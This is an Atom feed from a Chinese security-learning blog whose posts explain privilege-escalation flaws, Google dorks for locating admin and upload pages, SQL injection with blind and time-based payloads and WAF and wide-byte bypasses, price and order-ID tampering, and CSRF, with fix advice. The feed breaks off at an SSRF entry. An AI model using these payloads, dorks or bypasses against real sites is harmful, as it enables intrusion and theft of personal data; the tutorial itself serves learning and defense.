<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FiveSeven</title>
  
  <subtitle>一个信息安全行业的成长者</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-03-30T09:15:09.885Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>FiveSeven</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>越权访问</title>
    <link href="http://example.com/2021/03/30/%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>http://example.com/2021/03/30/%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
    <published>2021-03-30T08:59:41.005Z</published>
    <updated>2021-03-30T09:15:09.885Z</updated>
    
    <content type="html"><![CDATA[<p>越权一般分为水平越权和垂直越权，水平越权是指相同权限的不同用户可以互相访问；垂直越权是指使用权限低的用户可以访问权限较高的用户。</p>        <h2 id="越权漏洞">          <a href="#越权漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2>              <h3 id="水平越权">          <a href="#水平越权" class="heading-link"><i class="fas fa-link"></i></a><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3>      <p>水平越权测试方法主要是看能否通过A用户的操作影响B用户。攻击者请求操作（增、删、查、改）某条数据时，Web    应用程序没有判断该数据的所属人，或者在判断数据所属人时直接从用户提交的表单参数中获取（如用户ID），导致攻击者可以自行修改参数（用户ID），操作不属于自己的数据。</p><p>例：</p><p>某高校教务系统存在平行越权漏洞。通过测试发现，学号有规律可循，学号后4位是连续的数字，普通用户登录系统后可越权查看其他学生的学籍信息、课程成绩等敏感信息。</p><p>步骤一：以“高某某”学号为12xxxx0031为例，登录教务系统，并查看该账号的学籍信息。查看学籍信息链接为   http：//xxx/search.do？m=xsx&amp;xh=12Sxxx0031。</p><p>步骤二：访问学号为 12Sxxx0032 的学生的学籍信息，链接为 http：//xxx/search.do？ m=xsx&amp;xh=12Sxxx0031。</p><p>步骤三：访问学号为 12Sxxx0033 的学生的学籍信息，链接为 http：//xxx/search.do？ m=xsx&amp;xh=12Sxxx0033。</p>        <h3 id="垂直越权">          <a href="#垂直越权" class="heading-link"><i class="fas fa-link"></i></a><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3>      <p>垂直越权测试方法的基本思路是低权限用户越权高权限用户的功能，比如普通用户可使用管理员功能。服务器为鉴别客户端浏览器会话及身份信息，会将用户身份信息存储在 Cookie中， 并发送至客户端存储。攻击者通过尝试修改Cookie中的身份标识为管理员，欺骗服务器分配管理员权限，达到垂直越权的目的。</p><p>例：</p><p>某办公系统存在纵向越权漏洞，通过修改Cookie可直接提升普通用户权限为系统权限。</p><p>步骤一：使用普通权限账号a02登录办公系统，成功登录后访问链接http：//xxx/aaa/bbb/editUser.asp？iD=2，尝试修改权限。由于普通用户无法访问修改权限模块，系统会跳转到NoPower页面提示用户无操作权限。</p><p>步骤二：使用Burp Suite修改Cookie中的Tname参数为admin，欺骗服务器该请求为系统管理员发出的，成功提升账号a02为系统管理员权限。</p><p>步骤三：再次访问权限修改modifyuser页面http：//xxx/aaa/bbb/editUser.asp？iD=2，可访问成功。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;越权一般分为水平越权和垂直越权，水平越权是指相同权限的不同用户可以互相访问；垂直越权是指使用权限低的用户可以访问权限较高的用户。&lt;/p&gt;

        &lt;h2 id=&quot;越权漏洞&quot;&gt;
          &lt;a href=&quot;#越权漏洞&quot; class=&quot;heading-lin</summary>
      
    
    
    
    <category term="其他" scheme="http://example.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>谷歌语法</title>
    <link href="http://example.com/2021/03/30/%E5%B8%B8%E7%94%A8%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/"/>
    <id>http://example.com/2021/03/30/%E5%B8%B8%E7%94%A8%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/</id>
    <published>2021-03-30T08:37:57.289Z</published>
    <updated>2021-03-30T08:44:48.203Z</updated>
    
    <content type="html"><![CDATA[<p>site：可以限制你搜索范围的域名；<br>inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用；<br>intext: 只搜索网页<body>部分中包含的文字(也就是忽略了标题、URL等的文字)；<br>intitle: 查包含关键词的页面，一般用于社工别人的webshell密码；<br>filetype：搜索文件的后缀或者扩展名；<br>intitle：限制你搜索的网页标题；</body></p>        <h3 id="查找后台地址：">          <a href="#查找后台地址：" class="heading-link"><i class="fas fa-link"></i></a><a href="#查找后台地址：" class="headerlink" title="查找后台地址："></a>查找后台地址：</h3>      <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">site:域名inurl:login<span class="token operator">|</span>admin<span class="token operator">|</span>manage<span class="token operator">|</span>member<span class="token operator">|</span>admin_login<span class="token operator">|</span>login_admin<span class="token operator">|</span>system<span class="token operator">|</span>login<span class="token operator">|</span>user<span class="token operator">|</span>main<span class="token operator">|</span>cms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="查找文本内容：">          <a href="#查找文本内容：" class="heading-link"><i class="fas fa-link"></i></a><a href="#查找文本内容：" class="headerlink" title="查找文本内容："></a>查找文本内容：</h3>      <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">site:域名 intext:管理<span class="token operator">|</span>后台<span class="token operator">|</span>登陆<span class="token operator">|</span>用户名<span class="token operator">|</span>密码<span class="token operator">|</span>验证码<span class="token operator">|</span>系统<span class="token operator">|</span>admin<span class="token operator">|</span>login<span class="token operator">|</span>sys<span class="token operator">|</span>managetem<span class="token operator">|</span>password<span class="token operator">|</span>username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="查找可注入点：">          <a href="#查找可注入点：" class="heading-link"><i class="fas fa-link"></i></a><a href="#查找可注入点：" class="headerlink" title="查找可注入点："></a>查找可注入点：</h3>      <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">site:域名 inurl:aspx<span class="token operator">|</span>jsp<span class="token operator">|</span>php<span class="token operator">|</span>asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="查找上传漏洞：">          <a href="#查找上传漏洞：" class="heading-link"><i class="fas fa-link"></i></a><a href="#查找上传漏洞：" class="headerlink" title="查找上传漏洞："></a>查找上传漏洞：</h3>      <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">site:域名 inurl:file<span class="token operator">|</span>load<span class="token operator">|</span>editor<span class="token operator">|</span>Files<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="找eweb编辑器：">          <a href="#找eweb编辑器：" class="heading-link"><i class="fas fa-link"></i></a><a href="#找eweb编辑器：" class="headerlink" title="找eweb编辑器："></a>找eweb编辑器：</h3>      <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">site:域名 inurl:ewebeditor<span class="token operator">|</span>editor<span class="token operator">|</span>uploadfile<span class="token operator">|</span>eweb<span class="token operator">|</span>edit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="存在的数据库：">          <a href="#存在的数据库：" class="heading-link"><i class="fas fa-link"></i></a><a href="#存在的数据库：" class="headerlink" title="存在的数据库："></a>存在的数据库：</h3>      <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">site:域名 filetype:mdb<span class="token operator">|</span>asp<span class="token operator">|</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="查看脚本类型：">          <a href="#查看脚本类型：" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看脚本类型：" class="headerlink" title="查看脚本类型："></a>查看脚本类型：</h3>      <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">site:域名 filetype:asp/aspx/php/jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="迂回策略入侵：">          <a href="#迂回策略入侵：" class="heading-link"><i class="fas fa-link"></i></a><a href="#迂回策略入侵：" class="headerlink" title="迂回策略入侵："></a>迂回策略入侵：</h3>      <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">inurl:cms/data/templates/images/index/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;site：可以限制你搜索范围的域名；&lt;br&gt;inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用；&lt;br&gt;intext: 只搜索网页&lt;body&gt;部分中包含的文字(也就是忽略了标题、URL等的文字)；&lt;br&gt;intitle: 查包含关键词的页面</summary>
      
    
    
    
    <category term="其他" scheme="http://example.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>Sql注入漏洞</title>
    <link href="http://example.com/2021/03/29/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/03/29/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-29T13:20:19.750Z</published>
    <updated>2021-03-29T14:26:09.217Z</updated>
    
    <content type="html"><![CDATA[<p>SQL注入是指攻击者通过把恶意SQL命令插入到Web表单的输入域或页面请求的查询字符串中，并且插入的恶意SQL命令会导致原有SQL语句作用发生改变，从而达到欺骗服务器执行恶意的SQL命令的一种攻击方式。</p>        <h2 id="SQL注入的分类">          <a href="#SQL注入的分类" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h2>      <p>1、回显注入。用户发起查询请求，服务器将查询结果返回到页面中进行显示。</p><p>2、盲注。无回显。</p>        <h3 id="寻找注入点页面显示">          <a href="#寻找注入点页面显示" class="heading-link"><i class="fas fa-link"></i></a><a href="#寻找注入点页面显示" class="headerlink" title="寻找注入点页面显示"></a>寻找注入点页面显示</h3>      <p>●页面没有变化:访问三个链接，显示的页面没有任何不同。这种情况说明后台针对此查询点的过滤比较严格，是否存在SQL注入漏洞还需进行后续测试。<br>●页面中少了部分内容:如访问前两个链接正常，第三个页面里有明显的内容缺失，则基本可以确定有漏洞存在。接下来就需要检测是否有union显示位，如果没有，也可尝试进行bool注入。<br>●错误回显:如果访问第三个链接后出现数据库报错信息，那么可以判定当前查询点存在注入，用标准的回显注入法即可实现SQL注入攻击。<br>●跳转到默认界面:如果第一个链接显示正常，第二、第三个链接直接跳转到首页或其他默认页面，那么这可能是后台有验证逻辑，或者是有在线防护系统或防护软件提供实时保护。之后可尝试绕过防护工具的思路(大小写混用、编码等)。●直接关闭连接:如果在访问上述第二、三个链接时出现访问失败，那么这种情况下可尝试利用Burpsuite抓取服务器响应包，观察包头server字段内容。根据经验，这种情况通常为防护类工具直接开启在线阻断导致，后续可利用编码、换行等</p>        <h3 id="盲注流程">          <a href="#盲注流程" class="heading-link"><i class="fas fa-link"></i></a><a href="#盲注流程" class="headerlink" title="盲注流程"></a>盲注流程</h3>      <p>盲注的难点在于前台没有回显位，导致无发直接获取到有效信息。只能对注入语句执行的正确与否进行判断。在实施盲注时，关键在于合理的实现目标数据的猜测，并利用时间延迟等手段实现猜测正确与否的证明。</p><p>盲注的语句在回显注入语句的基础上额外加入判断语句，是的返回结果只有对和错。</p><p>判断数据库密码：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">and ascii<span class="token punctuation">(</span>substring<span class="token variable"><span class="token punctuation">((</span>select password from users where id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">49</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用时间延迟判断正确与否：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">union <span class="token keyword">select</span> if<span class="token punctuation">(</span>substring<span class="token punctuation">(</span>password,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span>,benchmark<span class="token punctuation">(</span><span class="token number">100000</span>,sha1<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">))</span>,0<span class="token punctuation">)</span>union <span class="token keyword">select</span> if<span class="token punctuation">(</span>substring<span class="token punctuation">(</span>password,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span>,sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中时间延迟利用了BENCHMARK函数，其意义是如果判断正确，则将1进行SHA1运算100000次，这样就产生了时间方面的滞后(由于100000次运算导致)。利用BENCHMARK函数时，如果目标服务器的数据库性能不强，极可能导致目标服务器宕机。因此推荐使用sleep函数，其用法为sleep(N),N为延迟秒数。当语句执行成功时，系统会根据sleep的时限进行延时输出。因此利用出现的延时情况来判断SQL注入语句是否成功执行。</p>        <h3 id="常见防护手段">          <a href="#常见防护手段" class="heading-link"><i class="fas fa-link"></i></a><a href="#常见防护手段" class="headerlink" title="常见防护手段"></a>常见防护手段</h3>      <p>SQL注入的防护方法包括参数过滤和预编译处理。参数过滤分为数据类型限制和危险字符处理。通俗地说就是:要么严防死守，细致检查;要么严格限定参数的有效范围(参数化查询)。总之就是要尽可能限制用户可提交参数的类型。</p>        <h3 id="参数类型检测绕过">          <a href="#参数类型检测绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#参数类型检测绕过" class="headerlink" title="参数类型检测绕过"></a>参数类型检测绕过</h3>      <p>222.194.15.74/newsPage.aspx?type_id=3&amp;new_id=690</p><p>可以看到,type_id或new_id均为数字类型。后台在接收到用户端提交的参数后，在数据库中查询相应的页面对应信息并显示。这种业务场景非常常见，也极易出现SQL注入情况。当然，还有很多Web页面利用POST方式提交用户参数，因此推荐利用抓包工具来分析。</p><p>(1）黑名单<br>黑名单过滤一般试图阻止SQL关键字、特定的单个字符或空白符，那么绕过黑名单防护措施的核心思路就是:将关键字或特定符号进行不同形式的变换，从而实现绕过过滤器的目的。针对黑名单，目前存在的绕过方式有以下几种。</p><p>使用大小写变种<br>通过改变攻击字符中的大小写尝试避开过滤，因为数据库中使用不区分大小写的方式处理SQL关键字，如’uNioN SeLect passwod FroM TabluSers WHERE username=’admin’—，在平台上可通过将or变形为oR(变成大写字母)来试验能否绕过。</p><p>使用SQL注释<br>使用注释符代替空格，如’UNIONSELECTpasswordFROM tablusersWHEREusernamelike’admin’，这样可避免后台对关键字符的过滤。最终执行SQL语句时，数据库会自动忽视注释符，导致实际执行语句为: UNION SELECT password FROM tablusers WHERE username like ‘admin’ 其中，like也可用于替代=，用以绕过针对=的过滤。</p><p>1)嵌套。<br>在过滤器阻止的字符前面增加一个采用URL编码的空字节(%00)。嵌套过滤后的表达式如selecselectt。过滤之后的部分就可重新结合成select。</p><p>2)用+号实现危险字符的拆分。<br>在数据库中，+号的作用为链接字符串，例如，or可利用+号拆分为’o’+’r’，这样可有效绕过前台的关键字检查，但在数据库执行时会自动变更为or。</p><p>3）利用系统注释符截断。<br>比如，在执行以下SQL语句时:select * from users where username= ‘admin’– and password = ‘xxx’ 用“–”对后面语句截断，进而导致SQL语句的语义发生变化,and后面的内容不会执行。</p><p>4）替换可能的危险字符。<br>例如，用“like”替换“=”或用“in”替换“=”，均可实现相同的效果。黑名单绕过的方法千变万化，这都是由于黑名单的过滤不够严格、数据库系统本身的特性导致的。因此，如果采用黑名单过滤，建议务必限制禁止执行的函数，仅仅禁用单引号、尖括号、等号、union、select并不会获得太好的效果。</p><p>(2)GPC过滤<br>GPC过滤是PHP在5.4版本之前存在的一种防护机制，其特点是在特殊字符前面添加斜线“”，如单引号’会形成“&quot;”的效果，导致原有的功能失效。因此，针对GPC过滤的情况，要对GPC添加的“\”进行转义。这种情况下可尝试宽字节注入方式。<br>宽字节带来的安全问题主要是编码转换引起的“吃ASCII字符”(一字节)的现象，如果合理拼接，可让吃掉一字节后的剩余内容重新拼接成一个单引号’。下面来分析MySQL的字符集转换过程。MySQL收到请求时将请求数据从character_set_client转换为character_set_connection。进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下:<br>1）使用每个数据字段的CHARACTER SET设定值。<br>2)若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)。<br>3)）若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值。<br>4 ）若上述值不存在，则使用character_set_server设定值。</p><p>最终将操作结果从内部操作字符集转换为character_set_results。</p><p>宽字节注入发生的原因就是PHP发送请求到MySQL时字符集使用character_set_client设置值进行了一次编码，如果编码为GB2312、GBK、GB18030、BIG5、Shift_JIS等双字节编码，就会存在宽字节注入漏洞。</p><p>如果目标页面进行了GPC过滤，将’(单引号)进行了转换，那么尝试在user参数写入%df’%20or%201=1%20limit%201,1%23&amp;&amp;pass=user1pass，看其是否进行了转换。解决宽字节漏洞的最好方式就是统一编码标准: Web页面及数据库均使用UTF-8进行编码。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;SQL注入是指攻击者通过把恶意SQL命令插入到Web表单的输入域或页面请求的查询字符串中，并且插入的恶意SQL命令会导致原有SQL语句作用发生改变，从而达到欺骗服务器执行恶意的SQL命令的一种攻击方式。&lt;/p&gt;

        &lt;h2 id=&quot;SQL注入的分类&quot;&gt;
   </summary>
      
    
    
    
    <category term="漏洞原理" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="漏洞原理" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>商品编号篡改漏洞（逻辑漏洞）</title>
    <link href="http://example.com/2021/03/29/%E5%95%86%E5%93%81%E7%BC%96%E5%8F%B7%E7%AF%A1%E6%94%B9%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/03/29/%E5%95%86%E5%93%81%E7%BC%96%E5%8F%B7%E7%AF%A1%E6%94%B9%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-29T08:51:52.740Z</published>
    <updated>2021-03-29T08:57:20.799Z</updated>
    
    <content type="html"><![CDATA[<p>在交易支付类型的业务中，最常见的业务漏洞就是修改商品金额。例如在生成商品订单、跳转支付页面时，修改 HTTP 请求中的金额参数，可以实现 1 分买充值卡、1元买特斯拉等操作。此类攻击很难从流量中匹配识别出来，通常只有在事后财务结算时发现大额账务问题，才会被发现。此时，攻击者可能已经通过该漏洞获得了大量利益。如果金额较小或财务审核不严，攻击者则可能细水长流，从中获得持续的利益。事后发现此类漏洞， 就大大增加了追责的难度和成本。</p><p>此类业务漏洞的利用方法，攻击者除了直接篡改商品金额，还可以篡改商品编号，同样会造成实际支付金额与商品不对应，但又交易成功的情况。攻击者可以利用此业务漏洞以低价购买高价的物品。</p>        <h2 id="过程">          <a href="#过程" class="heading-link"><i class="fas fa-link"></i></a><a href="#过程" class="headerlink" title="过程"></a>过程</h2>      <p>攻击者提交订单时，抓包篡改商品编号，导致商品与价格不对应但却交易成功，从而从中获利。</p>        <h3 id="步骤">          <a href="#步骤" class="heading-link"><i class="fas fa-link"></i></a><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3>      <p>步骤一：登录某积分商城http：//xxxxx.com.cn/club/index.php？m=goods&amp;c=lists。</p><p>步骤二：列出积分换商品，先挑选出我想要的礼物，如商品编号为goods_id=1419f75d406811e3ae7601beb44c5ff7.</p><p>步骤三：选择商城中积分最低的礼物兑换（5 积分的杯子），并填好相关信息，抓包修改goods_id。</p><p>步骤四：替换goods_id=1419f75d406811e3ae7601beb44c5ff7（30积分），替换成功。</p><p>步骤五：订单页面显示用5积分换购需要30积分的鼠标成功。</p>        <h3 id="修复建议">          <a href="#修复建议" class="heading-link"><i class="fas fa-link"></i></a><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3>      <p>建议商品金额不要在客户端传入，防止被篡改。如果确实需要在客户端传输金额，则服务端在收到请求后必须检查商品价格和交易金额是否一致，或对支付金额做签名校验， 若不一致则阻止该交易。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在交易支付类型的业务中，最常见的业务漏洞就是修改商品金额。例如在生成商品订单、跳转支付页面时，修改 HTTP 请求中的金额参数，可以实现 1 分买充值卡、1元买特斯拉等操作。此类攻击很难从流量中匹配识别出来，通常只有在事后财务结算时发现大额账务问题，才会被发现。此时，攻击者</summary>
      
    
    
    
    <category term="漏洞原理" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="漏洞原理" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>订单ID篡改漏洞（逻辑漏洞）</title>
    <link href="http://example.com/2021/03/29/%E8%AE%A2%E5%8D%95ID%E7%AF%A1%E6%94%B9%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/03/29/%E8%AE%A2%E5%8D%95ID%E7%AF%A1%E6%94%B9%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-29T08:20:49.777Z</published>
    <updated>2021-03-29T08:49:17.851Z</updated>
    
    <content type="html"><![CDATA[<p>在有电子交易业务的网站中，用户登陆后可以下订单购买相应产品，购买成功后，用户可以查看订单详情。当开发人员没有考虑登陆后用户之间权限隔离的问题时，就会导致平行权限绕过漏洞。攻击者只需注册一个普通账户，就可以通过篡改、遍历订单ID，获得其他用户订单详情，其中多数包括用户的姓名、身份证、地址、电话号码等敏感信息。黑色产业链的攻击者通常会利用此漏洞得到这些隐私信息。</p>        <h2 id="过程">          <a href="#过程" class="heading-link"><i class="fas fa-link"></i></a><a href="#过程" class="headerlink" title="过程"></a>过程</h2>      <p>注册一个普通账户，然后篡改、遍历订单ID，获得其他用户订单详情。</p>        <h3 id="步骤">          <a href="#步骤" class="heading-link"><i class="fas fa-link"></i></a><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3>      <p>假设某保险公司网站存在平行权限绕过漏洞。登陆网站后，访问URL，修改响应参数的值，可以遍历获得他人保单内容，其中包含很多敏感隐私信息。<span class="exturl"><a class="exturl__link" href="http://xxxxx.com/SL_LES/policyDetailInfo.do?policyNo=P000000018446847">http://xxxxx.com/SL_LES/policyDetailInfo.do?policyNo=P000000018446847</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>步骤一、登录一个账号（如果没有注册一个），查看本人保单。</p><p>步骤二、抓包修改保单号，即可越权查看他人保单内容。</p><p>在返回的数据包中，包含全部界面中被隐藏的身份证号码等敏感信息。</p>        <h3 id="修复建议">          <a href="#修复建议" class="heading-link"><i class="fas fa-link"></i></a><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3>      <p>后台查看订单时要通过Session机制判断用户身份，做好平行权限控制，服务端需要</p><p>校验相应订单是否和登录者的身份一致，如发现不一致则拒绝请求，防止平行权限绕过漏洞泄露用户敏感个人隐私信息。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在有电子交易业务的网站中，用户登陆后可以下订单购买相应产品，购买成功后，用户可以查看订单详情。当开发人员没有考虑登陆后用户之间权限隔离的问题时，就会导致平行权限绕过漏洞。攻击者只需注册一个普通账户，就可以通过篡改、遍历订单ID，获得其他用户订单详情，其中多数包括用户的姓名、</summary>
      
    
    
    
    <category term="漏洞原理" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="漏洞原理" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>跨站请求伪造漏洞</title>
    <link href="http://example.com/2021/03/28/CSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/03/28/CSRF%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-28T06:39:32.345Z</published>
    <updated>2021-03-28T06:59:31.392Z</updated>
    
    <content type="html"><![CDATA[<p>跨站请求伪造漏洞被称为安全漏洞中“沉睡中的巨人”，由此可见，该漏洞是一个巨大的安全隐患。它与SQL注入漏洞及跨站脚本漏洞并称为安全漏洞中的“三大天王”，而其他的安全漏洞基本上都可与这“三大天王”中的任何一个配合并产生一些复合的、高技巧的攻击手法。该漏洞对攻击者来讲，常有“柳暗花明”的突破，而对于安全防御者而言，却是一件十分头疼的事。</p>        <h2 id="Cookie和Session">          <a href="#Cookie和Session" class="heading-link"><i class="fas fa-link"></i></a><a href="#Cookie和Session" class="headerlink" title="Cookie和Session"></a>Cookie和Session</h2>              <h3 id="Cookie">          <a href="#Cookie" class="heading-link"><i class="fas fa-link"></i></a><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3>      <p>Cookie是一个保存在用户的本地计算机上的txt文件，用来保存用户登录的信息。例如只要你登录成功一次，Cookie就会保存你的登录凭证，下次再登录的时候就不需要输入登录凭证，浏览器直接携带该Cookie通过服务器的验证，进而操作登录权限以下的内容。当然，前提是你的本地浏览器启用了Cookie功能。Cookie的使用是不是很方便呢?答案当然是“是的”。可是，方便的同时也给用户带来了安全隐患。若攻击者盗取了用户本地计算机系统上的Cookie，那么，攻击者就可以冒充用户的身份，无须输入登录凭证即可直接使用用户的Cookie访问登录权限以下的内容。例如:若该Cookie是用户保存在本地计算机系统里的网银登录成功以后的Cookie，那么可能就会直接危及用户的资金安全。Cookie的功能如此强大，那么Cookie中存储的究竟是什么内容呢?答案是Session ID。</p>        <h3 id="Session">          <a href="#Session" class="heading-link"><i class="fas fa-link"></i></a><a href="#Session" class="headerlink" title="Session"></a>Session</h3>      <p>Session是保存在服务器的内存中、服务器的文本文件中或者是服务器的数据库(Redis及MongoDB等）中的一种与Cookie—一对应的凭证。每一个登录成功的用户都会产生一个Cookie及一个Session，它们—一对应。Cookie保存在用户的本地计算机系统里,Session却保存在服务器上。当用户的浏览器下次携带Cookie进行登录验证的时候，服务器就会寻找并判断Session中存储的信息与Cookie中存储的信息是否是“一对”，若是则通过验证，若不是则禁止访问登录权限以下的内容。Session的功能如此强大，那么Session中存储的究竟是什么内容呢?答案是用户的身份信息、登录状态信息及用户的操作权限等一系列与用户身份、权限相关的信息。这些信息都是通用的、频繁存取的并且与用户直接或者间接相关的。有比较才有鉴别，否则Cookie提交过来的身份信息该如何鉴别真伪?如何鉴别是不是本地计算机系统的浏览器在操纵呢?试想:若攻击者没有用户的Cookie，却能任意修改Session，是不是也可以达到入侵的目的呢?答案显然是可以。只需要修改Cookie与Session为“一对”即可，因为Cookie与Session本来就是——对应的。</p>        <h2 id="CSRF漏洞原理">          <a href="#CSRF漏洞原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF漏洞原理" class="headerlink" title="CSRF漏洞原理"></a>CSRF漏洞原理</h2>      <p>跨站请求伪造漏洞的攻击就是利用Cookie与Session自身的弱点来达到入侵用户的目的的。举个例子:用户打开了网银贝,此时，时时刻刻都有Cookie与Session的——对应验证（因为HTTP请求是无状态的请求，所以时刻需要鉴别用户的身份真伪)，交易应该很安全。可是，若用户的浏览器开启了Cookie功能，这时候用户的本地计算机系统里就会产生用户登录凭证信息。此时若攻击者发一个恶意链接给用户，而该链接是针对网银页面转账操作的，攻击者意图将用户网银中的资金通过转账的方式转移到其他账户中，此时的你却并不知情，为什么呢?因为攻击者已将恶意链接伪装成了正常链接（例如领取红包等)，如果用户由于好奇心或者其他原因点击了领取红包的链接，那么，用户网银中的资金就会不知不觉被窃取了。这是如何实现的呢?因为用户启用了浏览器的Cookie功能。当用户点击了攻击者精心伪装的恶意链接后，浏览器就会自动寻找并携带用户本地与网银页面有关的Cookie信息去操作网银页面。服务器只能检测到该操作是来自本地计算机系统的浏览器，却并不能判定该操作是否为网银所有者本人自愿的操作。如此一来，攻击者就窃取了用户的网银资金，严重损害了用户的个人利益，从技术上来讲就达到了跨站请求伪造漏洞的攻击目的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;跨站请求伪造漏洞被称为安全漏洞中“沉睡中的巨人”，由此可见，该漏洞是一个巨大的安全隐患。它与SQL注入漏洞及跨站脚本漏洞并称为安全漏洞中的“三大天王”，而其他的安全漏洞基本上都可与这“三大天王”中的任何一个配合并产生一些复合的、高技巧的攻击手法。该漏洞对攻击者来讲，常有“柳</summary>
      
    
    
    
    <category term="漏洞原理" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="漏洞原理" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>服务器请求伪造漏洞</title>
    <link href="http://example.com/2021/03/28/SSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/03/28/SSRF%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-28T06:18:03.435Z</published>
    <updated>2021-03-28T06:38:01.330Z</updated>
    
